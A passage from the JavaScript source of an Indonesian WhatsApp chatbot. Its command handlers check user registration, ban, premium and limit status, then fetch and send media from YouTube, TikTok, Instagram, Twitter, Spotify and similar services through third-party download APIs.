							const { dl_link, thumb, title, filesizeF, filesize } = res
							axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
							.then(async (a) => {
							if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*Data berhasil di dapatkan!*\n\n*Title :* ${title}\n*Ext :* MP3\n*Filesize :* ${filesizeF}\n*Link :* ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
							const captions = `*Data berhasil di dapatkan!*\n\n*Title :* ${title}\n*Ext :* MP4\n*Size :* ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
							sendMediaURL(from, thumb, captions)
							await sendMediaURL(from, dl_link).catch(() => reply(mess.error.bug))
							})                
							})
							} catch (err) {
							reply(mess.error.bug)
							}
					   break      
case 'mediafire':
            	if (!isRegistered) return reply(mess.only.userB)
            	if (isBanned) return reply(mess.only.benned)
             	if (!isPremium) return reply(mess.only.premium)
            	if (isLimit(sender)) return reply(mess.limituser)
            	if (args.length == 0) return reply(`Example: ${prefix + command} https://www.mediafire.com/file/1xgaov026oc44n0/photo_2021-02-05_10-13-39.jpg/file`)
				if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
				reply(mess.wait)
				teks = args.join(' ')
				res = await mediafireDl(teks)
				result = `*Data Berhasil Didapatkan!*

*Title :* ${res[0].nama}
*Size :* ${res[0].size}
*Link :* ${res[0].link}


_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
			   reply(result)
			   sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
             	await limitAdd(sender) 
	            break
case 'musikyt':
            	if (!isRegistered) return reply(mess.only.userB)
            	if (isBanned) return reply(mess.only.benned)
            	if (!isPremium) return reply(mess.only.premium)
            	if (isLimit(sender)) return reply(mess.limituser)
            	reply(mess.wait)
			    if (args.length == 0) return reply(`Contoh: ${prefix + command} Damara de medhot janji`)
			    query = args.join(" ")
			    try{
			    anu = await fetchJson(`https://api.vhtear.com/ytmp3?query=${query}&apikey=${VthearApi}`)
			    ini_txt = `*Title :* ${anu.result.title}\n`
			    ini_txt += `*Ext :* ${anu.result.ext}\n`
			    ini_txt += `*Id :* ${anu.result.id}\n`
			    ini_txt += `*Size :* ${anu.result.size}\n`
			    ini_txt += `*Duration :* ${anu.result.duration}\n`
			    ini_txt += `*Source :* ${anu.result.url}\n`
			    ini_buffer = await getBuffer(anu.result.image)
			    client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
			    get_audio = await getBuffer(anu.result.mp3)
			    client.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek })
			    await limitAdd(sender) 
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
			    }
			    break 
		case 'simi':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
				if (args.length == 0) return reply(`Contoh: ${prefix + command} hai simi`)
				query = args.join(" ")
				get_result = await fetchJson(`http://api.lolhuman.xyz/api/simi?apikey=${LolApi}&text=${query}`)
				ini_txt = `*Simi:* ${get_result.result}`
				reply(ini_txt)
				await limitAdd(sender) 
				break
	case 'joox':
		        if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Contoh: ${prefix + command} Melukis Senja`)
			    query = args.join(" ")
			    reply(mess.wait)
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jooxplay?apikey=${LolApi}&query=${query}`)
			    get_result = get_result.result
			    ini_txt = `Title : ${get_result.info.song}\n`
			    ini_txt += `Artists : ${get_result.info.singer}\n`
			    ini_txt += `Duration : ${get_result.info.duration}\n`
			    ini_txt += `Album : ${get_result.info.album}\n`
			    ini_txt += `Uploaded : ${get_result.info.date}\n`
			    ini_txt += `Lirik :\n${get_result.lirik}\n`
			    thumbnail = await getBuffer(get_result.image)
			    client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
			    get_audio = await getBuffer(get_result.audio[0].link)
			    client.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: mek })
			    await limitAdd(sender) 
			    break	   
		   case 'spotifydl':
		    	if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
		    	if (isLimit(sender)) return reply(mess.limituser)
		    	if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
		    	url = args[0]
			    reply(mess.wait)
			    try{
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotify?apikey=${LolApi}&url=${url}`)
			    get_result = get_result.result
			    ini_txt = `*Title :* ${get_result.title}\n`
			    ini_txt += `*Artist :* ${get_result.artists}\n`
			    ini_txt += `*Duration :* ${get_result.duration}\n`
			    ini_txt += `*Popularity :* ${get_result.popularity}\n\n*[AUDIO SEDANG DI DOWNLOAD]*`
			    thumbnail = await getBuffer(get_result.thumbnail)
			    client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
			    get_audio = await getBuffer(get_result.link)
			    client.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek })
			    await limitAdd(sender) 
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
			    }
			   break
		   case 'spotifysearch':
		    	if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
		     	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			    query = args.join(" ")
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotifysearch?apikey=${LolApi}&query=${query}`)
			    get_result = get_result.result
			    ini_txt = ""
			    for (var x of get_result) {
				   ini_txt += `Title : ${x.title}\n`
				   ini_txt += `Artists : ${x.artists}\n`
				   ini_txt += `Duration : ${x.duration}\n`
				   ini_txt += `Link : ${x.link}\n`
				   ini_txt += `Preview : ${x.preview_url}\n\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
			   
			   case 'ytsearch3':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			    query = args.join(" ")
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytsearch?apikey=${LolApi}&query=${query}`)
			    get_result = get_result.result
			    ini_txt = `*Hasil pencarian :* ${query}\n\n`
			    for (var x of get_result) {
				ini_txt +=`═════════════════\n`
				ini_txt += `*Title :* ${x.title}\n`
				ini_txt += `*Views :* ${x.views}\n`
				ini_txt += `*Published :* ${x.published}\n`
				ini_txt += `*Thumbnail :* ${x.thumbnail}\n`
				ini_txt += `*Link Video :* https://www.youtube.com/watch?v=${x.videoId}\n`
			   }
			   ini_txt +=`═════════════════`
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
			case 'ytsearch2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			    query = args.join(" ")
			    get_result = await fetchJson(`https://api.vhtear.com/youtube?query=${query}&apikey=${VthearApi}`)
			    get_result = get_result.result
			    ini_txt = `*Hasil pencarian :* ${query}\n\n`
			    for (var x of get_result) {
				   ini_txt +=`═════════════════\n`
				   ini_txt += `*Title :* ${x.title}\n`
				   ini_txt += `*Views :* ${x.views}\n`
				   ini_txt += `*Channel :* ${x.channel}\n`
				   ini_txt += `*Duration :* ${x.duration}\n`
				   ini_txt += `*Thumbnail :* ${x.image}\n`
				   ini_txt += `*Link Video :* ${x.urlyt}\n`
			   }
			   ini_txt +=`═════════════════`
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
		case 'sc':
		case 'scbot':
		case 'script':
		case 'scriptbot':
			const srdd = "6289526565831@s.whatsapp.net"
			const bjirr = `Scipt ini menggunakan script dari IVAN XTEAM
Total fitur bot ini 400
Bot type NODEJS V14
Version V2
Server ${os.hostname}
Developer @${srdd.split("@")[0]}
Berminat menggunakan script ini? chat developer / pengembang`
				   client.sendMessage(from, bjirr, text, { quoted: mek, contextInfo: {"mentionedJid": [srdd]}})
				   break
	case 'ytsearch':
	        	if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	        	if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply('Tolong masukan query!')
				var srch = args.join(" ");
				try {
				var aramas = await yts(srch);
				   } catch {
				return await client.sendMessage(from, 'Error!', MessageType.text)
				}
				aramat = aramas.all 
				var ytresult = '';
				ytresult += `*Hasil pencarian :* ${srch}\n\n`
				aramas.all.map((video) => {
				ytresult += `═════════════════\n`	   
				ytresult += '*Title :* ' + video.title + '\n'
				ytresult += '*Link :* ' + video.url + '\n'
				ytresult += '*Durasi :* ' + video.timestamp + '\n'
				ytresult += '*Upload :* ' + video.ago + '\n'
				});
				ytresult += `═════════════════`
				reply(ytresult)
			    break
	case 'ytplay':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
		    if (args.length == 0) return await reply(`Example: ${prefix + command} Melukis Senja`)
		    reply(mess.wait)
		    query = args.join(" ")
		    try{
		    anu = await fetchJson(`http://api.lolhuman.xyz/api/ytplay2?apikey=${LolApi}&query=${query}`)
			caption = `*Title :* ${anu.result.title}\n\n_Silahkan tunggu file audio sedang dikirim, mungkin butuh beberapa menit_`
			ini_buffer = await getBuffer(anu.result.thumbnail)
			await client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: caption })
			get_audio = await getBuffer(anu.result.audio)
	    	await client.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
			await limitAdd(sender) 
			} catch (e) {
			console.log(`Error :`, color(e,'red'))
			reply(mess.error.bug)
			}
			break
	case 'ytpremium':
			    if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
			    if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			    reply(mess.wait)
			    query = args.join(" ")
			    try{
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytplay2?apikey=${LolApi}&query=${query}`)
			    get_result = get_result.result
			    ini_buffer = await getBuffer(get_result.thumbnail)
			    client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: get_result.title })
			    get_audio = await getBuffer(get_result.audio)
			    client.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, filename: `${get_result.title}.mp3`, quoted: mek })
			    get_video = await getBuffer(get_result.video)
		   	    client.sendMessage(from, get_video, video, { mimetype: Mimetype.mp4, filename: `${get_result.title}.mp4`, quoted: mek })
				await limitAdd(sender) 
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
		     	}
			    break			   
			case 'ytmp3':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
				reply(mess.wait)
				try{
			    anu = await fetchJson(`http://api.lolhuman.xyz/api/ytaudio?apikey=${LolApi}&url=${args[0]}`)
			    yty = `*「 YOUTUBE MP3 DOWNLOADER 」*\n\n*• Title :* ${anu.result.title}\n*• Uploader :* ${anu.result.uploader}\n*• Channel :* ${anu.result.channel}\n*• Duration :* ${anu.result.duration}\n*• View :* ${anu.result.view}\n*• Like :* ${anu.result.like}\n*• Dislike :* ${anu.result.dislike}\n*• Description :* ${anu.result.description}\n\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
			    buffert = await getBuffer(anu.result.thumbnail)
			    buffer = await getBuffer(anu.result.link.link)
			    client.sendMessage(from, buffert, image, {quoted: mek, caption: yty})
			    client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek, caption: 'Nih om'})
			    await limitAdd(sender) 
				} catch (e) {
				console.log(`Error :`, color(e,'red'))
			    reply(mess.error.bug)
			    }
				break
			case 'ytmp3v2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			    try{	
				reply(mess.wait)	
		        anu = await fetchJson(`https://api.zeks.me/api/ytmp3?url=${args[0]}&apikey=${zeksapi}`)
			    yty = `*「 YOUTUBE MP3 DOWNLOADER 」*\n\n*• Title :* ${anu.result.title}\n*• Size :* ${anu.result.size}\n`
			    buffert = await getBuffer(anu.result.thumbnail)
			    buffer = await getBuffer(anu.result.url_audio)
			    client.sendMessage(from, buffert, image, {quoted: mek, caption: yty})
			    client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek, caption: 'Nih om'})
			    await limitAdd(sender) 
				} catch (e) {
				console.log(`Error :`, color(e,'red'))
			    reply(mess.error.bug)
			   }
			   break
		case 'ytmp3v3':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)	
				if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
				try{
				reply(mess.wait)
			    anu = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/ytmp3/?url=${args[0]}&apikey=404Api`)
			    yty = `*「 YOUTUBE MP3 DOWNLOADER 」*\n\n*• Title :* ${anu.result.title}\n*• size :* ${anu.result.size}\n`
			    buffert = await getBuffer(anu.result.thumbnail)
			    buffer = await getBuffer(anu.result.url_audio)
			    client.sendMessage(from, buffert, image, {quoted: mek, caption: yty})
			    await client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek, caption: 'Nih om'})
			    await limitAdd(sender) 
				} catch (e) {
			    console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
			    }
			    break
		case 'ytmp4':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			    try{
				reply(mess.wait)
			    anu = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/ytmp4?url=${args[0]}&apikey=404Api`)
			    teks = `*「 YOUTUBE MP4 DOWNLOADER 」*\n\n*• Title :* ${anu.result.title}\n*• Size :* ${anu.result.size}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
	            thumb = await getBuffer(anu.result.thumbnail)
    		 	client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
			    buffer2 = await getBuffer(anu.result.url_video)
			    client.sendMessage(from, buffer2, video, {mimetype: 'video/mp4', filename: `${anu.result.title}.mp4`, quoted: mek})
				await limitAdd(sender) 
				} catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
	            }
	            break
		case 'ytmp4v2':
			    if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
	            try{
			    reply(mess.wait)
			    anu = await fetchJson(`https://api.zeks.me/api/ytmp4?url=${args[0]}&apikey=${zeksapi}`, {method: 'get'})
	            teks = `*Title* : ${anu.result.title}\n*size* : ${anu.result.size}\n`
	            thumb = await getBuffer(anu.result.thumbnail)
		     	client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
	            buffer2 = await getBuffer(anu.result.url_video)
	            client.sendMessage(from, buffer2, video, {mimetype: 'video/mp4', filename: `mlkn.mp4`, quoted: mek})
	            await limitAdd(sender) 
		        } catch (e) {
		        console.log(`Error :`, color(e,'red'))
		        reply(mess.error.bug)
	            }
	            break
case 'ytmp4v3':
             	if (!isRegistered) return reply(mess.only.userB)
             	if (isBanned) return reply(mess.only.benned)
            	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)	
	            try{
			    reply(mess.wait)
			    anu = await fetchJson(`https://api.zeks.me/api/ytmp4/2?url=${args[0]}&apikey=${zeksapi}`, {method: 'get'})
	            teks = `*Title* : ${anu.result.title}\n*Size* : ${anu.result.size}\n*Quality* : ${anu.result.quality}\n*Ext* : ${anu.result.ext}\n`
	            thumb = await getBuffer(anu.result.thumb)
		    	client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
	            buffer2 = await getBuffer(anu.result.link)
             	client.sendMessage(from, buffer2, video, {mimetype: 'video/mp4', filename: `mlkn.mp4`, quoted: mek})
	            await limitAdd(sender) 
		        } catch (e) {
		        console.log(`Error :`, color(e,'red'))
		        reply(mess.error.bug)
	            }
	            break
	case 'ig':
	case 'igdl':
	        	if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
				if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.error.Iv)
				if (q.includes('https://www.instagram.com/stories/')) return reply(mess.error.Iv)
				if (q.includes('https://instagram.com/stories/')) return reply(mess.error.Iv)
				reply(mess.wait)
				hx.igdl(args[0])
				.then(async(result) => {
				for(let i of result.medias){
				if(i.url.includes('mp4')){
				let link = await getBuffer(i.url)
				client.sendMessage(from,link,video,{quoted: mek })
			    } else {
				let link = await getBuffer(i.url)
				client.sendMessage(from,link,image,{quoted: mek })                  
				}
				}
			    });
				await limitAdd(sender) 
				break
	case 'ig2':
	case 'igdl2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
			 	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
			    if (q.includes('https://www.instagram.com/stories/')) return reply(mess.error.Iv)
				if (q.includes('https://instagram.com/stories/')) return reply(mess.error.Iv)
				reply (mess.wait)
			    try{
			    ini_url = args[0]
			    anu = await fetchJson(`http://api.lolhuman.xyz/api/instagram2?apikey=${LolApi}&url=${ini_url}`)
			    client.sendMessage(from,`*Username:* ${anu.result.account.username}\n*Full Name:* ${anu.result.account.full_name}\n*Caption:* ${anu.result.caption}`, MessageType.text)
			    ini_result = anu.result.media
			    for (var x of ini_result) {
				ini_type = image
				if (x.includes(".mp4")) ini_type = video
				ini_buffer = await getBuffer(x)
				client.sendMessage(from, ini_buffer, ini_type, { quoted: mek })
				}
				} catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
				}
			    await limitAdd(sender) 
				break
	case 'ig3':
	case 'igdl3':
		    	if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
				if (q.includes('https://www.instagram.com/stories/')) return reply(mess.error.Iv)
				if (q.includes('https://instagram.com/stories/')) return reply(mess.error.Iv)
				reply(mess.wait)
			    try{
			    ini_url = args[0]
			    anu = await fetchJson(`http://api.lolhuman.xyz/api/instagram?apikey=${LolApi}&url=${ini_url}`)
			    ini_url = anu.result
			    ini_type = image
			    if (ini_url.includes(".mp4")) ini_type = video
			    ini_buffer = await getBuffer(ini_url)
				client.sendMessage(from, ini_buffer, ini_type, { quoted: mek })
				} catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
				}
				await limitAdd(sender) 
			    break
		case 'fb':
		case 'fbdl':
			    if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
		    	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
		 	    reply(mess.wait)
			    try{
			    ini_url = args[0]
			    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/facebook?apikey=${LolApi}&url=${ini_url}`)
			    ini_url = ini_url.result
			    ini_buffer = await getBuffer(ini_url)
			    client.sendMessage(from, ini_buffer, video, { quoted: mek })
			    await limitAdd(sender) 
		        } catch (e) {
			    console.log(`Error :`, color(e,'red'))
			    reply(mess.error.bug)
		        } 
			   break	
		case'twitter':
		case'twitterdl':
	        	if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	        	if (isLimit(sender)) return reply(mess.limituser)
	        	if (!isPremium) return reply(mess.only.premium)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
			    reply(mess.wait)
				ten = args[0]
			    hx.twitter(`${ten}`)
				.then(async(g) => {
			    yaww = await getBuffer(g.thumb)
				yaww_video = await getBuffer(g.HD)
                client.sendMessage(from, yaww, image, {quoted: mek, caption: `*Desc :* ${g.desc}`})
				client.sendMessage(from, yaww_video, video, {quoted: mek})
				})
				await limitAdd(sender) 
			    break
		case 'twitter2':
		case 'twitterdl2':
			    if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
				reply(mess.wait)
				try{
				ini_url = args[0]
                anu = await fetchJson(`http://api.lolhuman.xyz/api/twitter?apikey=${LolApi}&url=${ini_url}`)
                ini_buffer = await getBuffer(anu.result.link[0].link)
				client.sendMessage(from, ini_buffer, video, { quoted: mek, caption: `*Caption:* ${anu.result.title}` })
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
			    }
				await limitAdd(sender) 
			    break	
		case 'twitter3':
		case 'twitterdl3':
			    if (!isRegistered) return reply(mess.only.userB)
		     	if (isBanned) return reply(mess.only.benned)
		    	if (isLimit(sender)) return reply(mess.limituser)
		    	if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
			    reply(mess.wait)
			    try{
			    ini_url = args[0]
			    anu = await fetchJson(`http://api.lolhuman.xyz/api/twitter2?apikey=${LolApi}&url=${ini_url}`)
			    yaw = `*Nama:* ${anu.result.user.name}
*Username:* ${anu.result.user.username}
*Publish:* ${anu.result.publish}
*Duration:* ${anu.result.duration}
*Title:* ${anu.result.title}`
ini_buffert = await getBuffer(anu.result.thumbnail)
client.sendMessage(from, ini_buffert, image, { quoted: mek ,caption: yaw}) 
			    ini_buffer = await getBuffer(anu.result.link[1].url)
			    client.sendMessage(from, ini_buffer, video, { quoted: mek })
	        	} catch (e) {
			    console.log(`Error :`, color(e,'red'))
			    reply(mess.error.bug)
		        }
			    await limitAdd(sender) 
			    break
	 case 'zippyshare':
		            if (!isRegistered) return reply(mess.only.userB)
				    if (isBanned) return reply(mess.only.benned)
			    	if (isLimit(sender)) return reply(mess.limituser)
			        if (args.length == 0) return reply(`Example: ${prefix + command} https://www51.zippyshare.com/v/5W0TOBz1/file.html`)
			        ini_url = args[0]
			        ini_url = await fetchJson(`http://api.lolhuman.xyz/api/zippyshare?apikey=${LolApi}&url=${ini_url}`)
			        ini_url = ini_url.result
			        ini_txt = `File Name : ${ini_url.name_file}\n`
		        	ini_txt += `Size : ${ini_url.size}\n`
			        ini_txt += `Date Upload : ${ini_url.date_upload}\n`
			        ini_txt += `Download Url : ${ini_url.download_url}`
			        reply(ini_txt)
			        await limitAdd(sender) 
			        break		   
	 case 'snack':
	    	if (!isRegistered) return reply(mess.only.userB)
	    	if (isBanned) return reply(mess.only.benned)
	    	if (isLimit(sender)) return reply(mess.limituser)
		    if (!isPremium) return reply(mess.only.premium)
		    if (args.length < 1) return reply(`Example ${prefix + command} http://sck.io/p/kdNLLeuP`)
		    reply(mess.wait)
		    anu = await fetchJson(`http://api.lolhuman.xyz/api/snackvideo?apikey=${LolApi}&url=${args[0]}`)
			sck = `*「 SNACK VIDEO DOWNLOADER 」*\n\n*• Caption:* ${anu.result.caption}\n*• Like:* ${anu.result.like}\n*• View:* ${anu.result.view}\n\n*TUNGGU SEBENTAR LAGI DIKIRIM MOHON JANGAN SPAM*`
		    bufft = await getBuffer(anu.result.thumbnail)
		    buffd = await getBuffer(anu.result.link)
		    client.sendMessage(from, bufft, image, {quoted: mek, caption: sck})
		    client.sendMessage(from, buffd, video, {mimetype: 'video/mp4', filename: `yasjd.mp4`, quoted: mek})
		    await limitAdd(sender) 
		    break     
	  case 'ytplay2':
	    	if (!isRegistered) return reply(mess.only.userB)
	    	if (isBanned) return reply(mess.only.benned)
	    	if (isLimit(sender)) return reply(mess.limituser)
			if (args.length == 0) return reply(`Example: ${prefix + command} Damara de medhot janji`)
		    reply(mess.wait)
			try{
		    query = body.slice(9)
		    anu = await fetchJson(`https://api.zeks.me/api/ytplaymp3?q=${query}&apikey=${ZeksApi}`, {method: 'get'})
		    if (anu.error) return reply(anu.error)
		 	infomp3 = `*「 YT PLAY MP3 」*\n*• Title :* ${anu.result.title}\n*• Size :* ${anu.result.size}\n*• Source :* ${anu.result.source}`
		    buffer = await getBuffer(anu.result.thumbnail)
		    lagu = await getBuffer(anu.result.url_audio)
			await sleep(4000)
		    client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
		    client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
		    await limitAdd(sender) 
		    } catch (e) {
			console.log(`Error :`, color(e,'red'))
			reply(mess.error.bug)
			}
		    break 
	case 'smule':
	        	if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    if (args.length < 1) return reply('Urlnya mana gan?')
			    if (!isUrl(args[0]) && !args[0].includes('c-ash.smule')) return reply(mess.error.Iv)
			    reply(mess.wait)
			    anu = await fetchJson(`http://api.lolhuman.xyz/api/smule?apikey=${LolApi}&url=${args[0]}`, {method: 'get'})
			    if (anu.error) return reply(anu.error)
			    teks = `*Title* : ${anu.title}\n\nTunggu sebentar 1 menit mungkin agak lama karna mendownload mideo`
			    thumb = await getBuffer(anu.thumb)
			    client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
			    buffer = await getBuffer(anu.result)
			    client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek, caption: 'Nih Gan'})
			    await limitAdd(sender) 	
			    break  
	case 'tiktoknowm':
	        	if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	        	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			    reply(mess.wait)
			    try{
			    ini_url = args[0]
			    ini_url = `http://api.lolhuman.xyz/api/tiktok?apikey=${LolApi}&url=${ini_url}`
			    get_result = await fetchJson(ini_url)
			    ini_buffer = await getBuffer(get_result.result.link)
			    client.sendMessage(from, ini_buffer, video, { quoted: mek})
			    await limitAdd(sender) 
		        } catch (e) {
			    console.log(`Error :`, color(e,'red'))
			    reply(mess.error.bug)
		        }
			    break
	case 'tiktokpremium':
	         	if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
				reply(mess.wait)
				hx.ttdownloader(`${args[0]}`)
				.then(async(result) => {
				yaww = await getBuffer(result.nowm)
				client.sendMessage(from, yaww,video, {quoted: mek})
				})
				.catch(e => console.log(e))
			    break
	case 'tiktokpremium2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			    reply(mess.wait)
			    try{
			    ini_url = args[0]
			    anu =  await fetchJson(`https://api.vhtear.com/tiktok_no_wm?link=${ini_url}&apikey=${VthearApi}`)
			    ini_buffer = await getBuffer(anu.result.video)
				client.sendMessage(from, ini_buffer, video, { quoted: mek})
			    await limitAdd(sender) 
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply('Error ngab, Sepertinya videonya tidak bisa di download')
			    } 
			    break
	case 'tiktokpremium3':
